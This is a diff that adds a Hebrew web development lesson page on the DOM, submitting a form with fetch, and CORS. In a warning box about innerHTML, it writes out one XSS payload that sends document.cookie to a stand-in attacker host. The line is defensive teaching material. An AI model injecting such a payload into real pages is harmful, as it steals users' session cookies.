@@ -1,0 +1,129 @@
+  <div class="box goal">
+    <span class="box-title">🎯 בשיעור הזה</span>
+    <ul>
+      <li>JavaScript בדפדפן: לבחור אלמנט, לשנות אותו, להגיב לאירוע.</li>
+      <li>טופס ← fetch ← הצגת התוצאה. ו־textContent מול innerHTML (XSS).</li>
+      <li>CORS: מה קורה, למה, ואיך מתקנים בשרת.</li>
+    </ul>
+  </div>
+
+  <h2>1. ה־DOM</h2>
+```html
+<script type="module" src="app.js"></script>
+```
+  <p>שורה אחת בסוף ה־`body`. `type="module"` — אותם `import`/`export` כמו ב־Node (פרק 8). בדפדפן אין `fs` ואין `process`, אבל יש `document` — הדף כעץ אובייקטים:</p>
+```js file=playground/app.js
+const title = document.querySelector("#title");    // אלמנט אחד (או null)
+const items = document.querySelectorAll("li");     // כל המתאימים
+
+title.textContent = "כותרת חדשה";                  // לשנות טקסט
+title.classList.add("highlight");                  // להוסיף class
+title.hidden = true;                               // להסתיר
+
+const li = document.createElement("li");           // ליצור אלמנט
+li.textContent = "משימה חדשה";
+document.querySelector("ul").append(li);           // להוסיף לדף
+
+document.querySelector("button").addEventListener("click", () => {
+  console.log("נלחץ!");                            // מופיע ב־Console של DevTools
+});
+```
+  <p>`addEventListener` — callback שרץ כשמשהו קורה (פרק 5 ופרק 10: אירועים). הנפוצים: `click`, `submit` (טופס נשלח), `input` (הקלדה), `change`.</p>
+
+  <h2>2. טופס ← שרת ← דף</h2>
+```js file=playground/app.js
+const API = "http://localhost:3000";
+
+document.querySelector("#new-task").addEventListener("submit", async (event) => {
+  event.preventDefault();                          // ← בלי זה הדפדפן מרענן את הדף
+  const fields = new FormData(event.target);       // הערכים לפי name
+  const res = await fetch(`${API}/tasks`, {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({ title: fields.get("title"), priority: fields.get("priority") }),
+  });
+  const data = await res.json();
+  if (!res.ok) {
+    document.querySelector("#error").textContent = data.error.message;
+    return;
+  }
+  const li = document.createElement("li");
+  li.textContent = data.title;
+  document.querySelector("#tasks").append(li);
+});
+```
+  <p>זה אותו `fetch` מפרק 14 — עם אותה מלכודת: צריך לבדוק `res.ok`. וההודעה שמוצגת היא `error.message` מה־API — עכשיו רואים למה כדאי שה־API יחזיר הודעות ברורות במבנה קבוע.</p>
+  <div class="box warn">
+    <span class="box-title">⚠️ textContent, לא innerHTML</span>
+    <p>`li.innerHTML = task.title` נראה אותו דבר — עד שמישהו יוצר משימה בשם `<img src=x onerror="fetch('https://evil.example/?c='+document.cookie)">`. הדפדפן מפרש את זה כ־HTML ו<strong>מריץ</strong> את הקוד אצל כל מי שצופה ברשימה. זו <strong>XSS</strong> — אחת הפרצות הנפוצות בעולם (OWASP, פרק 21). `textContent` תמיד מציג טקסט כמו שהוא. אם חייבים לבנות HTML ממחרוזות — מקודדים כל ערך (תרגיל E06).</p>
+  </div>
+
+  <h2>3. CORS</h2>
+  <p>הפעל את פרויקט 2 (פורט 3000), ודף שמריץ את הקוד למעלה מכתובת אחרת (פורט 5500 — בשיעור 4). לחיצה על "הוספה" — ובקונסול:</p>
+```term
+!! Access to fetch at 'http://localhost:3000/tasks' from origin 'http://localhost:5500' has been blocked by CORS policy: No 'Access-Control-Allow-Origin' header is present on the requested resource.
+!! Failed to load resource: net::ERR_FAILED
+```
+  <p>ו־`fetch` זורק `TypeError: Failed to fetch`. אבל עם curl — אותה בקשה עובדת. מה קורה?</p>
+  <figure>
+    <svg viewBox="0 0 720 250" role="img" aria-label="דפדפן חוסם תשובה מ-origin אחר בלי header">
+      <defs><marker id="ac1" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="7" markerHeight="7" orient="auto-start-reverse"><path d="M0 0 L10 5 L0 10 z" style="fill:var(--svg-stroke)"/></marker></defs>
+      <g style="stroke-width:2">
+        <rect x="470" y="30" width="230" height="150" rx="10" style="fill:var(--accent-soft);stroke:var(--accent)"/>
+        <rect x="490" y="95" width="190" height="60" rx="8" style="fill:var(--svg-fill);stroke:var(--muted)"/>
+        <rect x="30" y="60" width="210" height="90" rx="10" style="fill:var(--green-soft);stroke:var(--green)"/>
+      </g>
+      <g style="stroke:var(--svg-stroke);stroke-width:2;fill:none">
+        <path d="M486 110 H 244" marker-end="url(#ac1)"/>
+        <path d="M244 135 H 486" marker-end="url(#ac1)"/>
+      </g>
+      <g text-anchor="middle">
+        <text x="585" y="55" direction="rtl" style="font-size:14px;font-weight:700">הדפדפן</text>
+        <text x="585" y="78" class="mono" style="font-size:11px">origin: localhost:5500</text>
+        <text x="585" y="120" direction="rtl" style="font-size:12px">הקוד של הדף (app.js)</text>
+        <text x="585" y="142" direction="rtl" style="font-size:11px;fill:var(--red)">✘ לא מקבל את התשובה</text>
+        <text x="135" y="95" direction="rtl" style="font-size:14px;font-weight:700">tasks-api</text>
+        <text x="135" y="118" class="mono" style="font-size:11px">localhost:3000</text>
+        <text x="365" y="102" class="mono" style="font-size:11px">GET /tasks · Origin: localhost:5500</text>
+        <text x="365" y="152" direction="rtl" style="font-size:11px">200 + JSON — אבל בלי Access-Control-Allow-Origin</text>
+      </g>
+      <text x="360" y="215" text-anchor="middle" direction="rtl" style="font-size:13px">השרת <tspan font-weight="700">ענה</tspan> (ביומן: GET /tasks 200). הדפדפן <tspan font-weight="700">קיבל</tspan> — ו<tspan font-weight="700">הסתיר</tspan> את התשובה מהקוד.</text>
+    </svg>
+    <figcaption>איור 1: CORS נאכף בדפדפן, לא בשרת. ולכן curl (שאינו דפדפן) לא מושפע.</figcaption>
+  </figure>
+  <ul>
+    <li><strong>Origin</strong> = פרוטוקול + host + port. `http://localhost:5500` ו־`http://localhost:3000` הם origins <em>שונים</em> (פורט שונה).</li>
+    <li><strong>Same-Origin Policy</strong>: כברירת מחדל, קוד בדף רשאי לקרוא תשובות רק מה־origin שלו. למה? בלי זה, כל אתר שתיכנס אליו היה יכול לשלוח בקשה לבנק שלך (הדפדפן מצרף את העוגיות שלך!) ו<em>לקרוא</em> את היתרה.</li>
+    <li><strong>CORS</strong> = הדרך של השרת לומר "ל־origin הזה מותר": header `Access-Control-Allow-Origin: http://localhost:5500` בתשובה.</li>
+  </ul>
+  <h3>Preflight</h3>
+  <p>בקשה "לא פשוטה" — למשל POST עם `Content-Type: application/json`, או PATCH/DELETE — הדפדפן לא שולח מיד. קודם הוא שואל, בבקשת `OPTIONS`:</p>
+```term
+% curl -i -X OPTIONS localhost:3000/tasks -H "Origin: http://localhost:5500" -H "Access-Control-Request-Method: POST" -H "Access-Control-Request-Headers: content-type"
+HTTP/1.1 204 No Content
+Access-Control-Allow-Origin: http://localhost:5500
+Vary: Origin, Access-Control-Request-Headers
+Access-Control-Allow-Methods: GET,HEAD,PUT,PATCH,POST,DELETE
+Access-Control-Allow-Headers: content-type
+.. ...
+```
+  <p>(זה הפלט אחרי התיקון למטה.) רק אם התשובה מתירה — נשלחת הבקשה האמיתית. ב־DevTools ← Network תראה שתי שורות: `OPTIONS` ואחריה `POST`.</p>
+  <h3>התיקון — בשרת</h3>
+```ts file=src/app.ts
+import cors from "cors";
+
+app.use(cors({ origin: ["http://localhost:5500"] }));   // לפני ה־routes
+```
+  <div class="box warn">
+    <span class="box-title">⚠️ לא `origin: "*"` "כדי שזה יעבוד"</span>
+    <p>`*` מתיר לכל אתר באינטרנט לקרוא את ה־API מדפדפן של משתמש. ל־API ציבורי לגמרי (מזג אוויר) זה בסדר. ל־API עם נתוני משתמשים — רשימה מפורשת של ה־origins שלך, מתוך משתנה סביבה (בייצור: הדומיין האמיתי).</p>
+  </div>
+  <div class="box tip">
+    <span class="box-title">💡 CORS הוא לא אבטחה של השרת</span>
+    <p>שים לב לאיור: השרת <em>הריץ</em> את הבקשה. CORS מגן על <strong>המשתמש</strong> (שאתר זר לא יקרא את הנתונים שלו דרך הדפדפן שלו) — לא על השרת. מי שרוצה לתקוף את השרת ישתמש ב־curl. להגנה על השרת: הזדהות והרשאות (פרק 21).</p>
+  </div>
+
+  <div class="box practice">
+    <span class="box-title">✍️ עכשיו בדף התרגילים</span>
+    <p>פתור: <a href="exercises.html#P15.5-E03">E03</a> · <a href="exercises.html#P15.5-E06">E06</a> · <a href="exercises.html#P15.5-E07">E07</a> · <a href="exercises.html#P15.5-E08">E08</a> · <a href="exercises.html#P15.5-E09">E09</a> · <a href="exercises.html#P15.5-E10">E10</a> · <a href="exercises.html#P15.5-E11">E11</a> · <a href="exercises.html#P15.5-E12">E12</a></p>
+  </div>
